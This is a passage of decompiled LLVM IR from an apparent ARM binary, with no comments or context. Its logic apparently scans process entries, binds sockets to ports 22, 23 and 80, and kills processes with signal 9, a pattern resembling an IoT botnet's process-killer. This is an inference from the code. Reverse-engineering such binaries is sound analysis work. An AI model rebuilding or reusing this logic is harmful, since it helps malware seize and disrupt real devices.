  uselistorder label %dec_label_pc_cd0cthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_ccf4.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_cc10, { 1, 0 }
  uselistorder label %dec_label_pc_cc10.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_cc00.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cb98, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cb40, { 2, 0, 1 }
  uselistorder label %dec_label_pc_cb24, { 1, 0 }
  uselistorder label %dec_label_pc_cac8, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_ca2c.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_ca7c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_ca44, { 1, 0 }
  uselistorder label %dec_label_pc_c9e8, { 1, 0 }
}

define i32 @function_ced0(i32 %arg1) local_unnamed_addr {
dec_label_pc_ced0:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-8480 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-4328 = alloca i32, align 4
  %v3_ced0 = load i32, i32* @r4, align 4
  %v6_ced0 = load i32, i32* @r5, align 4
  %v9_ced0 = load i32, i32* @r6, align 4
  %v12_ced0 = load i32, i32* @r7, align 4
  %v15_ced0 = load i32, i32* @r8, align 4
  %v18_ced0 = load i32, i32* @sb, align 4
  %v21_ced0 = load i32, i32* @sl, align 4
  %v24_ced0 = load i32, i32* @fp, align 4
  %v27_ced0 = load i32, i32* @lr, align 4
  %v2_cee0 = call i32 @function_10f8c(i32* null)
  store i32 %v2_cee0, i32* @r0, align 4
  store i32 %v2_cee0, i32* @r7, align 4
  %v0_cee8 = call i32 @function_10ffc()
  %v7_ceec = icmp eq i32 %v0_cee8, -1
  %. = zext i1 %v7_ceec to i32
  %tmp136 = icmp slt i32 %v0_cee8, 1
  %storemerge96 = select i1 %tmp136, i32 %., i32 1
  store i32 %storemerge96, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_212e0.59 to i32), i32* %r3.global-to-local, align 4
  %v2_cf08 = icmp eq i32 %storemerge96, 0
  store i32 %v0_cee8, i32* @global_var_212e0.59, align 4
  br i1 %v2_cf08, label %dec_label_pc_cf24, label %dec_label_pc_cf14

dec_label_pc_cf14:                                ; preds = %dec_label_pc_d040, %dec_label_pc_cf24, %dec_label_pc_ced0
  %v1_cf20 = phi i32 [ %v2_cfdc, %dec_label_pc_cf24 ], [ %v0_cee8, %dec_label_pc_ced0 ], [ 0, %dec_label_pc_d040 ]
  store i32 %v3_ced0, i32* @r4, align 4
  store i32 %v6_ced0, i32* @r5, align 4
  store i32 %v9_ced0, i32* @r6, align 4
  store i32 %v12_ced0, i32* @r7, align 4
  store i32 %v15_ced0, i32* @r8, align 4
  store i32 %v18_ced0, i32* @sb, align 4
  store i32 %v21_ced0, i32* @sl, align 4
  store i32 %v24_ced0, i32* @fp, align 4
  store i32 %v27_ced0, i32* @lr, align 4
  ret i32 %v1_cf20

dec_label_pc_cf24:                                ; preds = %dec_label_pc_ced0
  %v1_cf28 = call i32 @function_133f8(i32 5)
  store i32 4096, i32* @r0, align 4
  %v0_cf30 = call i32 @function_11d34()
  store i32 ptrtoint (i32* @global_var_1f254.61 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_212dc.63 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_cf30, i32* %r2.global-to-local, align 4
  %v0_cf40 = load i32, i32* @r5, align 4
  %v1_cf40 = trunc i32 %v0_cf40 to i8
  %v3_cf40 = inttoptr i32 %v0_cf30 to i8*
  store i8 %v1_cf40, i8* %v3_cf40, align 1
  %v0_cf48 = load i32, i32* @r5, align 4
  %v1_cf48 = load i32, i32* %r3.global-to-local, align 4
  %v2_cf48 = inttoptr i32 %v1_cf48 to i32*
  store i32 %v0_cf48, i32* %v2_cf48, align 4
  %v0_cf4c = load i32, i32* %r2.global-to-local, align 4
  %v1_cf4c = load i32, i32* %r1.global-to-local, align 4
  %v2_cf4c = inttoptr i32 %v1_cf4c to i32*
  store i32 %v0_cf4c, i32* %v2_cf4c, align 4
  %v1_cf50 = call i32 @function_1030c(i32 13)
  %v1_cf58 = call i32 @function_1030c(i32 14)
  %v2_cf60 = ptrtoint i32* %stack_var_-4328 to i32
  store i32 %v2_cf60, i32* %r2.global-to-local, align 4
  %v0_cf64 = load i32, i32* @r5, align 4
  store i32 %v0_cf64, i32* %r1.global-to-local, align 4
  %v2_cf70 = inttoptr i32 %v0_cf64 to i32*
  %v3_cf70 = call i32 @function_10248(i32 13, i32* %v2_cf70)
  %v1_cf78 = add i32 %v2_cf60, -56
  store i32 %v1_cf78, i32* %r3.global-to-local, align 4
  store i32 %v3_cf70, i32* %r1.global-to-local, align 4
  store i32 %v1_cf78, i32* @r0, align 4
  %v2_cf88 = inttoptr i32 %v1_cf78 to i8*
  %v3_cf88 = call i32 @function_10874(i8* %v2_cf88, i32 %v3_cf70)
  store i32 %v3_cf88, i32* @r0, align 4
  %v2_cf90 = add i32 %v3_cf88, %v1_cf78
  store i32 %v2_cf90, i32* @r4, align 4
  %v0_cf94 = call i32 @function_10f78()
  %v2_cf9c = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_cf9c, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_cfa4 = trunc i32 %v0_cf94 to i8
  %v4_cfa4 = call i32 @function_10cac(i8 %v3_cfa4, i32 10, i32 %v2_cf9c)
  store i32 %v4_cfa4, i32* %r1.global-to-local, align 4
  %v0_cfac = load i32, i32* @r4, align 4
  store i32 %v0_cfac, i32* @r0, align 4
  %v2_cfb0 = inttoptr i32 %v0_cfac to i8*
  %v3_cfb0 = call i32 @function_10874(i8* %v2_cfb0, i32 %v4_cfa4)
  %v0_cfb4 = load i32, i32* @r5, align 4
  store i32 %v0_cfb4, i32* %r1.global-to-local, align 4
  %v1_cfb8 = load i32, i32* @r4, align 4
  %v2_cfb8 = add i32 %v1_cfb8, %v3_cfb0
  store i32 %v2_cfb8, i32* @r4, align 4
  %v2_cfc0 = inttoptr i32 %v0_cfb4 to i32*
  %v3_cfc0 = call i32 @function_10248(i32 14, i32* %v2_cfc0)
  store i32 %v3_cfc0, i32* %r1.global-to-local, align 4
  %v0_cfc8 = load i32, i32* @r4, align 4
  store i32 %v0_cfc8, i32* @r0, align 4
  %v2_cfcc = inttoptr i32 %v0_cfc8 to i8*
  %v3_cfcc = call i32 @function_10874(i8* %v2_cfcc, i32 %v3_cfc0)
  %v0_cfd0 = load i32, i32* @r5, align 4
  store i32 %v0_cfd0, i32* %r1.global-to-local, align 4
  store i32 %v3_cfcc, i32* @r6, align 4
  %v2_cfdc = call i32 @function_10f18(i32 %v1_cf78, i32 %v0_cfd0)
  %v7_cfe0 = icmp eq i32 %v2_cfdc, -1
  br i1 %v7_cfe0, label %dec_label_pc_cf14, label %dec_label_pc_cfe8

dec_label_pc_cfe8:                                ; preds = %dec_label_pc_cf24
  %v1_cfe8 = call i32 @function_1130c(i32 %v2_cfdc)
  %v1_cff0 = call i32 @function_1026c(i32 13)
  %v1_cff8 = call i32 @function_1026c(i32 14)
  store i32 ptrtoint (i32* @global_var_212dc.63 to i32), i32* @lr, align 4
  %v2_d004 = load i32, i32* @global_var_212dc.63, align 4
  store i32 %v2_d004, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_d010 = call i32 @function_11070(i32 %v1_cf78, i32 %v2_d004, i32 4095)
  %v7_d014 = icmp eq i32 %v3_d010, -1
  br i1 %v7_d014, label %.thread9, label %bb139

bb139:                                            ; preds = %dec_label_pc_cfe8
  store i32 ptrtoint (i32* @global_var_212dc.63 to i32), i32* %r1.global-to-local, align 4
  %v3_d01c = load i32, i32* @global_var_212dc.63, align 4
  store i32 %v3_d01c, i32* %r3.global-to-local, align 4
  %v1_d020 = load i32, i32* @r5, align 4
  %v2_d020 = trunc i32 %v1_d020 to i8
  %v5_d020 = add i32 %v3_d01c, %v3_d010
  %v6_d020 = inttoptr i32 %v5_d020 to i8*
  store i8 %v2_d020, i8* %v6_d020, align 1
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_cfe8, %bb139
  store i32 %v1_cf78, i32* %r2.global-to-local, align 4
  %v0_d028 = load i32, i32* @r6, align 4
  %v1_d028 = load i32, i32* @r4, align 4
  %v1_cf78.neg = sub i32 56, %v2_cf60
  %v2_d028 = add i32 %v1_cf78.neg, %v0_d028
  %v2_d02c = add i32 %v2_d028, %v1_d028
  store i32 %v2_d02c, i32* @r1, align 4
  store i32 %v1_cf78, i32* @r0, align 4
  %v0_d034 = call i32 @function_108e0()
  %v0_d038 = load i32, i32* @r5, align 4
  store i32 400, i32* @sl, align 4
  %v2_d0d0 = ptrtoint i32* %stack_var_-304 to i32
  %v2_d340 = ptrtoint i32* %stack_var_-224 to i32
  %v2_d34c = bitcast i32* %stack_var_-224 to i8*
  %v2_d390 = ptrtoint i32* %stack_var_-288 to i32
  %v2_d394 = bitcast i32* %stack_var_-288 to i8*
  %v2_d4e0 = ptrtoint i32* %stack_var_-44 to i32
  %v2_d4ec = ptrtoint i32* %stack_var_-48 to i32
  %v2_d504 = ptrtoint i32* %stack_var_-8480 to i32
  %v2_d250 = ptrtoint i32* %stack_var_-144 to i32
  %v2_d218 = ptrtoint i32* %stack_var_-128 to i32
  %v2_d1e0 = ptrtoint i32* %stack_var_-112 to i32
  %v2_d1ac = ptrtoint i32* %stack_var_-96 to i32
  %v2_d174 = ptrtoint i32* %stack_var_-80 to i32
  %v2_d12c = ptrtoint i32* %stack_var_-64 to i32
  br label %dec_label_pc_d040

dec_label_pc_d040:                                ; preds = %dec_label_pc_d308, %.thread9
  %stack_var_-8484.0 = phi i32 [ %v0_d038, %.thread9 ], [ %stack_var_-8484.3, %dec_label_pc_d308 ]
  %v1_d044 = call i32 @function_1030c(i32 13)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d050 = call i32 @function_10248(i32 13, i32* null)
  %v1_d054 = call i32 @function_11508(i32 %v3_d050)
  store i32 %v1_d054, i32* @fp, align 4
  %v2_d058 = icmp eq i32 %v1_d054, 0
  br i1 %v2_d058, label %dec_label_pc_cf14, label %dec_label_pc_d060

dec_label_pc_d060:                                ; preds = %dec_label_pc_d040
  %v1_d064 = call i32 @function_1026c(i32 13)
  %v1_d070 = call i32 @function_c93c(i32 58811)
  %v1_d07c = call i32 @function_c93c(i32 50951)
  %v1_d088 = call i32 @function_c93c(i32 14853)
  %v1_d090 = call i32 @function_c93c(i32 20480)
  %v1_d09c = call i32 @function_c93c(i32 47873)
  %v1_d0a8 = call i32 @function_c93c(i32 57616)
  %v1_d0b4 = call i32 @function_c93c(i32 2842)
  %v1_d0c0 = call i32 @function_c93c(i32 10522)
  %v1_d0c8 = call i32 @function_c93c(i32 5632)
  store i32 %v2_d0d0, i32* @lr, align 4
  store i32 20480, i32* %r3.global-to-local, align 4
  store i32 24465, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d118 = call i32 @function_11aec(i32 2, i32 1, i32 0)
  %v7_d11c = icmp eq i32 %v3_d118, -1
  store i32 %v3_d118, i32* @r4, align 4
  br i1 %v7_d11c, label %dec_label_pc_d144, label %dec_label_pc_d128

dec_label_pc_d128:                                ; preds = %dec_label_pc_d060
  store i32 %v2_d12c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d134 = call i32 @function_1189c(i32 %v3_d118, i32 %v2_d12c, i32 16)
  %v0_d138 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d140 = call i32 @function_11988(i32 %v0_d138, i32 1)
  br label %dec_label_pc_d144

dec_label_pc_d144:                                ; preds = %dec_label_pc_d060, %dec_label_pc_d128
  %v1_d148 = call i32 @function_c93c(i32 5888)
  %v2_d14c = icmp eq i32 %v1_d148, 0
  br i1 %v2_d14c, label %dec_label_pc_d60c, label %dec_label_pc_d154

dec_label_pc_d154:                                ; preds = %dec_label_pc_d630, %dec_label_pc_d620, %dec_label_pc_d60c, %dec_label_pc_d144, %dec_label_pc_d644
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d160 = call i32 @function_11aec(i32 2, i32 1, i32 0)
  %v7_d164 = icmp eq i32 %v3_d160, -1
  store i32 %v3_d160, i32* %r4.global-to-local, align 4
  br i1 %v7_d164, label %dec_label_pc_d18c, label %dec_label_pc_d170

dec_label_pc_d170:                                ; preds = %dec_label_pc_d154
  store i32 %v2_d174, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d17c = call i32 @function_1189c(i32 %v3_d160, i32 %v2_d174, i32 16)
  %v0_d180 = load i32, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d188 = call i32 @function_11988(i32 %v0_d180, i32 1)
  br label %dec_label_pc_d18c

dec_label_pc_d18c:                                ; preds = %dec_label_pc_d154, %dec_label_pc_d170
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d198 = call i32 @function_11aec(i32 2, i32 1, i32 0)
  %v7_d19c = icmp eq i32 %v3_d198, -1
  store i32 %v3_d198, i32* %r4.global-to-local, align 4
  br i1 %v7_d19c, label %dec_label_pc_d1c4, label %dec_label_pc_d1a8

dec_label_pc_d1a8:                                ; preds = %dec_label_pc_d18c
  store i32 %v2_d1ac, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d1b4 = call i32 @function_1189c(i32 %v3_d198, i32 %v2_d1ac, i32 16)
  %v0_d1b8 = load i32, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d1c0 = call i32 @function_11988(i32 %v0_d1b8, i32 1)
  br label %dec_label_pc_d1c4

dec_label_pc_d1c4:                                ; preds = %dec_label_pc_d18c, %dec_label_pc_d1a8
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d1d0 = call i32 @function_11aec(i32 2, i32 1, i32 0)
  %v7_d1d4 = icmp eq i32 %v3_d1d0, -1
  store i32 %v3_d1d0, i32* %r4.global-to-local, align 4
  br i1 %v7_d1d4, label %dec_label_pc_d1f8, label %dec_label_pc_d1e0

dec_label_pc_d1e0:                                ; preds = %dec_label_pc_d1c4
  store i32 %v2_d1e0, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d1e8 = call i32 @function_1189c(i32 %v3_d1d0, i32 %v2_d1e0, i32 16)
  %v0_d1ec = load i32, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d1f4 = call i32 @function_11988(i32 %v0_d1ec, i32 1)
  br label %dec_label_pc_d1f8

dec_label_pc_d1f8:                                ; preds = %dec_label_pc_d1c4, %dec_label_pc_d1e0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d204 = call i32 @function_11aec(i32 2, i32 1, i32 0)
  %v7_d208 = icmp eq i32 %v3_d204, -1
  store i32 %v3_d204, i32* %r4.global-to-local, align 4
  br i1 %v7_d208, label %dec_label_pc_d230, label %dec_label_pc_d214

dec_label_pc_d214:                                ; preds = %dec_label_pc_d1f8
  store i32 %v2_d218, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d220 = call i32 @function_1189c(i32 %v3_d204, i32 %v2_d218, i32 16)
  %v0_d224 = load i32, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d22c = call i32 @function_11988(i32 %v0_d224, i32 1)
  br label %dec_label_pc_d230

dec_label_pc_d230:                                ; preds = %dec_label_pc_d1f8, %dec_label_pc_d214
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d23c = call i32 @function_11aec(i32 2, i32 1, i32 0)
  %v7_d240 = icmp eq i32 %v3_d23c, -1
  store i32 %v3_d23c, i32* @r4, align 4
  br i1 %v7_d240, label %dec_label_pc_d268.preheader, label %dec_label_pc_d24c

dec_label_pc_d24c:                                ; preds = %dec_label_pc_d230
  store i32 %v2_d250, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d258 = call i32 @function_1189c(i32 %v3_d23c, i32 %v2_d250, i32 16)
  %v0_d25c = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d264 = call i32 @function_11988(i32 %v0_d25c, i32 1)
  br label %dec_label_pc_d268.preheader

dec_label_pc_d268.preheader:                      ; preds = %dec_label_pc_d24c, %dec_label_pc_d230
  %v0_d26860 = load i32, i32* @fp, align 4
  %v1_d26c61 = inttoptr i32 %v0_d26860 to i32*
  %v2_d26c62 = call i32 @function_1164c(i32* %v1_d26c61)
  %v2_d27064 = icmp eq i32 %v2_d26c62, 0
  br i1 %v2_d27064, label %dec_label_pc_d308, label %dec_label_pc_d278.preheader

dec_label_pc_d278.preheader:                      ; preds = %dec_label_pc_d268.preheader, %dec_label_pc_d268.backedge
  %v0_d27872 = phi i32 [ %v2_d26c, %dec_label_pc_d268.backedge ], [ %v2_d26c62, %dec_label_pc_d268.preheader ]
  %stack_var_-8484.165 = phi i32 [ %stack_var_-8484.1.be, %dec_label_pc_d268.backedge ], [ %stack_var_-8484.0, %dec_label_pc_d268.preheader ]
  br label %dec_label_pc_d278

dec_label_pc_d278:                                ; preds = %dec_label_pc_d278.preheader, %dec_label_pc_d2f0
  %v0_d288 = phi i32 [ %v2_d2fc, %dec_label_pc_d2f0 ], [ %v0_d27872, %dec_label_pc_d278.preheader ]
  %stack_var_-8484.2 = phi i32 [ %v1_d29c, %dec_label_pc_d2f0 ], [ %stack_var_-8484.165, %dec_label_pc_d278.preheader ]
  %v1_d278 = add i32 %v0_d288, 11
  %v2_d278 = inttoptr i32 %v1_d278 to i8*
  %v3_d278 = load i8, i8* %v2_d278, align 1
  %v4_d278 = zext i8 %v3_d278 to i32
  %v1_d27c = add nsw i32 %v4_d278, -48
  store i32 %v1_d27c, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_d27c, 9
  br i1 %tmp, label %dec_label_pc_d268.backedge, label %dec_label_pc_d288

dec_label_pc_d288:                                ; preds = %dec_label_pc_d278
  store i32 %v1_d278, i32* @r6, align 4
  store i32 %v1_d278, i32* @r0, align 4
  %v1_d290 = call i32 @function_13144(i32 %v1_d278)
  %v0_d298 = load i32, i32* @sl, align 4
  %v1_d29c = add i32 %stack_var_-8484.2, 1
  store i32 %v1_d290, i32* @r8, align 4
  %v5_d2a8 = icmp slt i32 %v0_d298, %v1_d290
  %v2_d318 = call i32 @function_10f8c(i32* null)
  br i1 %v5_d2a8, label %dec_label_pc_d314, label %dec_label_pc_d2ac

dec_label_pc_d2ac:                                ; preds = %dec_label_pc_d288
  %v0_d2b4 = load i32, i32* @r7, align 4
  %v2_d2b4 = sub i32 %v2_d318, %v0_d2b4
  %v7_d2bc = icmp slt i32 %v2_d2b4, 601
  br i1 %v7_d2bc, label %dec_label_pc_d2c4, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_d2ac
  store i32 400, i32* @sl, align 4
  br label %dec_label_pc_d268.backedge

dec_label_pc_d2c4:                                ; preds = %dec_label_pc_d2ac
  %v0_d2c4 = load i32, i32* @r8, align 4
  %v7_d2c8 = icmp slt i32 %v0_d2c4, 401
  br i1 %v7_d2c8, label %dec_label_pc_d268.backedge, label %dec_label_pc_d2cc

dec_label_pc_d2cc:                                ; preds = %dec_label_pc_d2c4
  store i32 %v1_d29c, i32* @lr, align 4
  %v3_d2d4 = zext i32 %v1_d29c to i64
  %v4_d2d4 = mul nuw i64 %v3_d2d4, 3435973837
  %v3_d2d81 = udiv i64 %v4_d2d4, 34359738368
  %v3_d2dc3 = mul nuw nsw i64 %v3_d2d81, 8
  %v3_d2dc = trunc i64 %v3_d2dc3 to i32
  store i32 %v3_d2dc, i32* %r3.global-to-local, align 4
  %v2_d2e05 = mul nuw nsw i64 %v3_d2d81, 2
  %v2_d2e0 = trunc i64 %v2_d2e05 to i32
  %v2_d2e4 = add i32 %v3_d2dc, %v2_d2e0
  store i32 %v2_d2e4, i32* %r2.global-to-local, align 4
  %v9_d2e8 = icmp eq i32 %v1_d29c, %v2_d2e4
  br i1 %v9_d2e8, label %dec_label_pc_d2f0, label %dec_label_pc_d268.backedge

dec_label_pc_d2f0:                                ; preds = %dec_label_pc_d2cc
  %v1_d2f4 = call i32 @function_133f8(i32 1)
  %v0_d2f8 = load i32, i32* @fp, align 4
  %v1_d2fc = inttoptr i32 %v0_d2f8 to i32*
  %v2_d2fc = call i32 @function_1164c(i32* %v1_d2fc)
  %v2_d300 = icmp eq i32 %v2_d2fc, 0
  br i1 %v2_d300, label %dec_label_pc_d308, label %dec_label_pc_d278

dec_label_pc_d308:                                ; preds = %dec_label_pc_d268.backedge, %dec_label_pc_d2f0, %dec_label_pc_d268.preheader
  %stack_var_-8484.3 = phi i32 [ %stack_var_-8484.0, %dec_label_pc_d268.preheader ], [ %v1_d29c, %dec_label_pc_d2f0 ], [ %stack_var_-8484.1.be, %dec_label_pc_d268.backedge ]
  %v0_d308 = load i32, i32* @fp, align 4
  %v1_d30c = inttoptr i32 %v0_d308 to i32*
  %v2_d30c = call i32 @function_11340(i32* %v1_d30c)
  br label %dec_label_pc_d040

dec_label_pc_d314:                                ; preds = %dec_label_pc_d288
  %v1_d324 = call i32 @function_1030c(i32 13)
  %v1_d32c = call i32 @function_1030c(i32 14)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d338 = call i32 @function_10248(i32 13, i32* null)
  store i32 %v2_d340, i32* @sb, align 4
  store i32 %v3_d338, i32* %r1.global-to-local, align 4
  store i32 %v2_d340, i32* @r0, align 4
  %v3_d34c = call i32 @function_10874(i8* %v2_d34c, i32 %v3_d338)
  %v1_d350 = load i32, i32* @sb, align 4
  %v2_d350 = add i32 %v1_d350, %v3_d34c
  store i32 %v2_d350, i32* %r5.global-to-local, align 4
  %v0_d354 = load i32, i32* @r6, align 4
  store i32 %v0_d354, i32* %r1.global-to-local, align 4
  store i32 %v2_d350, i32* @r0, align 4
  %v2_d35c = inttoptr i32 %v2_d350 to i8*
  %v3_d35c = call i32 @function_10874(i8* %v2_d35c, i32 %v0_d354)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_d35c, i32* %r4.global-to-local, align 4
  %v3_d36c = call i32 @function_10248(i32 14, i32* null)
  store i32 %v3_d36c, i32* %r1.global-to-local, align 4
  %v1_d374 = load i32, i32* %r5.global-to-local, align 4
  %v2_d374 = add i32 %v1_d374, %v3_d35c
  store i32 %v2_d374, i32* @r0, align 4
  %v2_d378 = inttoptr i32 %v2_d374 to i8*
  %v3_d378 = call i32 @function_10874(i8* %v2_d378, i32 %v3_d36c)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d384 = call i32 @function_10248(i32 13, i32* null)
  store i32 %v3_d384, i32* %r1.global-to-local, align 4
  store i32 %v2_d390, i32* @r0, align 4
  %v3_d394 = call i32 @function_10874(i8* %v2_d394, i32 %v3_d384)
  %v2_d3a0 = add i32 %v3_d394, %v2_d390
  store i32 %v2_d3a0, i32* @r5, align 4
  store i32 %v2_d3a0, i32* @r0, align 4
  %v0_d3a8 = load i32, i32* @r6, align 4
  store i32 %v0_d3a8, i32* %r1.global-to-local, align 4
  %v2_d3ac = inttoptr i32 %v2_d3a0 to i8*
  %v3_d3ac = call i32 @function_10874(i8* %v2_d3ac, i32 %v0_d3a8)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_d3ac, i32* @r4, align 4
  %v3_d3bc = call i32 @function_10248(i32 29, i32* null)
  store i32 %v3_d3bc, i32* %r1.global-to-local, align 4
  %v0_d3c4 = load i32, i32* @r4, align 4
  %v1_d3c4 = load i32, i32* @r5, align 4
  %v2_d3c4 = add i32 %v1_d3c4, %v0_d3c4
  store i32 %v2_d3c4, i32* @r0, align 4
  %v2_d3c8 = inttoptr i32 %v2_d3c4 to i8*
  %v3_d3c8 = call i32 @function_10874(i8* %v2_d3c8, i32 %v3_d3bc)
  %v1_d3d0 = call i32 @function_1026c(i32 13)
  %v1_d3d8 = call i32 @function_1026c(i32 14)
  store i32 %v1_cf78, i32* %r1.global-to-local, align 4
  store i32 4095, i32* @r2, align 4
  %v3_d3ec = call i32 @function_11070(i32 %v2_d340, i32 %v1_cf78, i32 4095)
  %v7_d3f0 = icmp eq i32 %v3_d3ec, -1
  store i32 %v3_d3ec, i32* @r5, align 4
  br i1 %v7_d3f0, label %dec_label_pc_d4b4, label %dec_label_pc_d3fc

dec_label_pc_d3fc:                                ; preds = %dec_label_pc_d314
  store i32 %v1_cf78, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_d404 = add i32 %v3_d3ec, %v1_cf78
  %v5_d404 = inttoptr i32 %v4_d404 to i8*
  store i8 0, i8* %v5_d404, align 1
  %v1_d40c = call i32 @function_1030c(i32 30)
  %v0_d410 = load i32, i32* @r4, align 4
  store i32 %v0_d410, i32* %r1.global-to-local, align 4
  %v2_d418 = inttoptr i32 %v0_d410 to i32*
  %v3_d418 = call i32 @function_10248(i32 30, i32* %v2_d418)
  %v0_d41c = load i32, i32* @r5, align 4
  %v1_d41c = add i32 %v0_d41c, -1
  store i32 %v1_d41c, i32* @r1, align 4
  store i32 %v3_d418, i32* %r2.global-to-local, align 4
  %v4_d428 = call i32 @function_10b9c(i8* %v2_cf88, i32 %v1_d41c, i32 %v3_d418)
  %v7_d42c = icmp eq i32 %v4_d428, -1
  br i1 %v7_d42c, label %dec_label_pc_d448, label %dec_label_pc_d434

dec_label_pc_d434:                                ; preds = %dec_label_pc_d3fc
  %v1_d438 = call i32 @function_10ee4(i32 %v1_cf78)
  %v0_d43c = load i32, i32* @r8, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d444 = call i32 @function_110d8(i32 %v0_d43c, i32 9)
  br label %dec_label_pc_d448

dec_label_pc_d448:                                ; preds = %dec_label_pc_d3fc, %dec_label_pc_d434
  %v1_d44c = call i32 @function_1026c(i32 30)
  store i32 %v1_d44c, i32* @r0, align 4
  %v0_d450 = call i32 @function_10f78()
  store i32 %v0_d450, i32* @r0, align 4
  %v1_d454 = load i32, i32* @r8, align 4
  %v9_d454 = icmp eq i32 %v0_d450, %v1_d454
  br i1 %v9_d454, label %dec_label_pc_d480, label %dec_label_pc_d45c

dec_label_pc_d45c:                                ; preds = %dec_label_pc_d448
  %v0_d45c = call i32 @function_10ed0()
  %v1_d460 = load i32, i32* @r8, align 4
  %v9_d460 = icmp eq i32 %v0_d45c, %v1_d460
  br i1 %v9_d460, label %dec_label_pc_d480, label %dec_label_pc_d468

dec_label_pc_d468:                                ; preds = %dec_label_pc_d45c
  store i32 ptrtoint (i32* @global_var_212dc.63 to i32), i32* %r3.global-to-local, align 4
  %v2_d470 = load i32, i32* @global_var_212dc.63, align 4
  store i32 %v2_d470, i32* %r1.global-to-local, align 4
  %v3_d474 = call i32 @function_10c2c(i8* %v2_cf88, i32 %v2_d470)
  %v2_d478 = icmp eq i32 %v3_d474, 0
  br i1 %v2_d478, label %dec_label_pc_d48c, label %dec_label_pc_d468.dec_label_pc_d480_crit_edge

dec_label_pc_d468.dec_label_pc_d480_crit_edge:    ; preds = %dec_label_pc_d468
  %v0_d484.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_d480

dec_label_pc_d480:                                ; preds = %dec_label_pc_d468.dec_label_pc_d480_crit_edge, %dec_label_pc_d45c, %dec_label_pc_d448
  %v0_d484 = phi i32 [ %v0_d484.pre, %dec_label_pc_d468.dec_label_pc_d480_crit_edge ], [ %v0_d45c, %dec_label_pc_d45c ], [ %v0_d450, %dec_label_pc_d448 ]
  store i32 %v2_d318, i32* @r7, align 4
  store i32 %v0_d484, i32* @sl, align 4
  br label %dec_label_pc_d268.backedge

dec_label_pc_d268.backedge:                       ; preds = %dec_label_pc_d2cc, %dec_label_pc_d2c4, %dec_label_pc_d278, %dec_label_pc_d480, %dec_label_pc_d5dc, %.thread10
  %stack_var_-8484.1.be = phi i32 [ %v1_d29c, %dec_label_pc_d5dc ], [ %v1_d29c, %dec_label_pc_d480 ], [ %v1_d29c, %.thread10 ], [ %stack_var_-8484.2, %dec_label_pc_d278 ], [ %v1_d29c, %dec_label_pc_d2c4 ], [ %v1_d29c, %dec_label_pc_d2cc ]
  %v0_d268 = load i32, i32* @fp, align 4
  %v1_d26c = inttoptr i32 %v0_d268 to i32*
  %v2_d26c = call i32 @function_1164c(i32* %v1_d26c)
  %v2_d270 = icmp eq i32 %v2_d26c, 0
